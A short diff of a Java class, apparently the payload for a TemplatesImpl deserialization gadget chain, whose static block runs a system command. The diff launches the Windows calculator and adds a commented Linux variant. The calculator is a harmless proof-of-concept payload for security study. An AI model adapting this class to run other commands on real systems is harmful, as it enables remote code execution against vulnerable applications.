@@ -9,7 +9,8 @@ import java.io.IOException;
 public class TemplatesImpl_RuntimeEvil extends AbstractTranslet {
     static{
         try {
-            Runtime.getRuntime().exec("calc");
+            Runtime.getRuntime().exec("calc");//windows
+//            Runtime.getRuntime().exec("gnome-calculator &");//linux
         } catch (IOException e) {
             throw new RuntimeException(e);
         }
